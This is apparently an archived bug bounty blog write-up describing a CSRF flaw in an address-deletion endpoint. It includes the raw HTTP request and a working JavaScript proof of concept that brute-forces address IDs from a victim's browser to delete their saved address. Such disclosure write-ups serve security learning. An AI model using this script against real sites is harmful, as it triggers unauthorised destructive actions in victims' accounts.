---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-10-15_an-inconsistent-csrf.md
original_filename: 2019-10-15_an-inconsistent-csrf.md
title: An inconsistent CSRF
category: documents
detected_topics:
- csrf
- command-injection
- otp
tags:
- imported
- documents
- csrf
- command-injection
- otp
language: en
raw_sha256: 57d127c8cae91b8bcbdf1e54d881a370f86c082ebf62decb04893d64eeeb60be
text_sha256: 1fce57a0773ba8a35bebe5e2ed0ad6b4d89f32f0fa356a9a271494da66315295
ingested_at: '2026-06-28T07:32:00Z'
sensitivity: unknown
redactions_applied: false
---

# An inconsistent CSRF

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-10-15_an-inconsistent-csrf.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, otp
- Ingested At: 2026-06-28T07:32:00Z
- Redactions Applied: False
- Raw SHA256: `57d127c8cae91b8bcbdf1e54d881a370f86c082ebf62decb04893d64eeeb60be`
- Text SHA256: `1fce57a0773ba8a35bebe5e2ed0ad6b4d89f32f0fa356a9a271494da66315295`


## Content

---
title: "An inconsistent CSRF"
page_title: "An inconsistent  CSRF – Smaran Chand"
url: "https://smaranchand.com.np/2019/10/an-inconsistent-csrf/"
final_url: "https://smaranchand.com.np/2019/10/an-inconsistent-csrf/"
authors: ["Smaran Chand (@smaranchand)"]
bugs: ["CSRF"]
publication_date: "2019-10-15"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4988
---

[October 15, 2019](https://smaranchand.com.np/2019/10/an-inconsistent-csrf/)

# An inconsistent CSRF

I discovered Cross-Site Request Forgery (CSRF) issue in one of the bug bounty programs but limited to some easy and simple actions only.

After spending a few minutes by browsing each and every functionality in the web application I discovered that a feature to delete “Shipping Address” from the account was not protected with CSRF token or any control mechanism. It wasn’t easy as I thought it, because one of the parameters was “dynamic” varying from account to account and it had a different numeric value for each user.
  
  
  POST /MySettings/DeleteAddress?addressId=14502 HTTP/1.1
  Host: www.xyzcompany.com
  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
  Accept: */*
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/json; charset=utf-8
  X-Requested-With: XMLHttpRequest
  Content-Length: 2
  Connection: close
  Referer: https://www.xyzcompany.com/MySettings
  Cookie: Nop.customer=peepdipeepdi_cookies_and_biscuits; ASP.NET_SessionId=sessionid_xxxx; __RequestVerificationToken=token_xxxx
  
  {}

As we can see in the HTTP request CSRF protection is not present but the parameter “addressId” differs from person to person. Now in order to make CSRF successful we need to guess addressId and craft the payload respectively which is very hard to gather.

I remembered we had faced this kind of issue during the VAPT project of a client at our workplace with my friend [Nittam](https://www.facebook.com/TheNittam) .

I wrote a simple JS code which would brute requests from victims browser within the provided range. For example, whenever a victim will click on CSRF payload his browser would send hundreds of the web request with certain range of numeric addressId and upon a match, the address from victims account will be deleted.
  
  
  <html>
  <!-- Dynamic CSRF PoC To delete address from any account -->
  <script>
  function submitRequest(id)
  {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://www.xyzcompany.com/MySettings/DeleteAddress?addressId="+id, true);
  xhr.setRequestHeader("Accept", "*/*");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
  xhr.setRequestHeader("Content-Type", "application/json; charset=utf-8");
  xhr.withCredentials = true;
  var body = "{}";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
  aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
  }
  for (i=14400;i < 14510; i++) {
  submitRequest(i);
  }
  </script>
  </html>
  
  

It is obvious that running above script would reduce the browser’s performance, the browser could act unresponsive as well because of hundreds of the request at a time.

Whenever a victim will visit the CSRF payload, the number of requests will be sent via the victim’s browser. And upon the match of AddressId, his saved address will be deleted.

![](https://smaranchand.com.np/wp-content/uploads/2019/10/Bruting_CSRF_Requests.png)Bruting AddressId and sending HTTP requests.

And It worked !!!

[Bug Bounty](https://smaranchand.com.np/writeups/bug-bounty/)
